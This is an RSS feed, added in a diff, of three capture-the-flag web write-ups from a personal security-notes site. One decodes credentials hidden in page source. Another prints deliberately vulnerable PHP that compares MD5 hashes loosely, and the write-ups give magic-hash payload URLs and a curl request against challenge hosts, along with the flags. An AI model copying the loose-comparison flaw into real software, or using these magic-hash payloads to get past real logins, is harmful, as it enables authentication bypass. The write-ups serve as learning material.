@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/practice/nisra/web/index.xml" rel="self" type="application/rss+xml"/><item><title>NISRA - different places</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</guid><description>&lt;h1 id="nisra---different-places">
+ NISRA - different places
+ &lt;a class="anchor" href="#nisra---different-places">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-nisra-ctf-web">
+ tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41025/">different places&lt;/a>&lt;/p>
+&lt;h2 id="exploit---integrate-fragments-flags">
+ Exploit - Integrate Fragments Flags
+ &lt;a class="anchor" href="#exploit---integrate-fragments-flags">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>View Page Sources
+&lt;img src="https://i.imgur.com/q3tSKo5.png" alt="" />
+&lt;img src="https://i.imgur.com/yrKjnyr.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>base64 decode
+&lt;code>dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE=&lt;/code> $\to$ &lt;code>username:admin_password:nisra&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Observe the form
+It uses get method to fetch the parameters. So we can peek &lt;code>login.php&lt;/code> first.
+&lt;img src="https://i.imgur.com/oGFwOoA.png" alt="" />
+Then we could use the username and password we got at previous step.
+Payload: &lt;code>view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;amp;password=nisra&lt;/code>
+Then we got the last fragment flag.&lt;/p></description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</guid><description>&lt;h1 id="nisra---md5_1">
+ NISRA - MD5_1
+ &lt;a class="anchor" href="#nisra---md5_1">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-nisra-ctf-web">
+ tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41022/">MD5_1&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
+ highlight_file(__FILE__);
+ $FROM_INCLUDE = true;
+ include(&amp;#34;flag.php&amp;#34;);
+ $msg = &amp;#34;&amp;#34;;
+ if (isset($_GET[&amp;#39;user&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;])) {
+ $user = $_GET[&amp;#39;user&amp;#39;];
+ $password = $_GET[&amp;#39;password&amp;#39;];
+ $check = &amp;#34;QNKCDZO&amp;#34;;
+ // the md5 of &amp;#34;QNKCDZO&amp;#34; is 0e830400451993494058024219903391
+
+ if ($user == &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; $password != $check &amp;amp;&amp;amp; md5($password) == md5($check)) {
+ $msg = &amp;#34;Flag: &amp;#34;.$flag;
+ } else {
+ $msg = &amp;#34;Keep trying!&amp;#34;;
+ }
+ }
+
+ echo $msg;
+?&amp;gt; 
+&lt;/code>&lt;/pre>&lt;h2 id="exploit---md5-collision">
+ Exploit - MD5 Collision
+ &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>http://chall2.nisra.net:41022/?user=admin&amp;amp;password=240610708&lt;/code>
+:::spoiler flag
+&lt;code>Flag: NISRA{PhP_is_th3_BeST_laNgUA9E}&lt;/code>
+:::&lt;/p></description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</guid><description>&lt;h1 id="nisra---md5_2">
+ NISRA - MD5_2
+ &lt;a class="anchor" href="#nisra---md5_2">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>curl http://chall2.nisra.net:41023/ -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -X POST -d &amp;quot;user=240610708&amp;amp;password=QNKCDZO&amp;quot;&lt;/code>
+Flag: &lt;code>NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}&lt;/code>&lt;/p>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://news.ycombinator.com/item?id=9484757">md5(&amp;lsquo;240610708&amp;rsquo;) == md5(&amp;lsquo;QNKCDZO&amp;rsquo;)&lt;/a>&lt;/p></description></item></channel></rss>
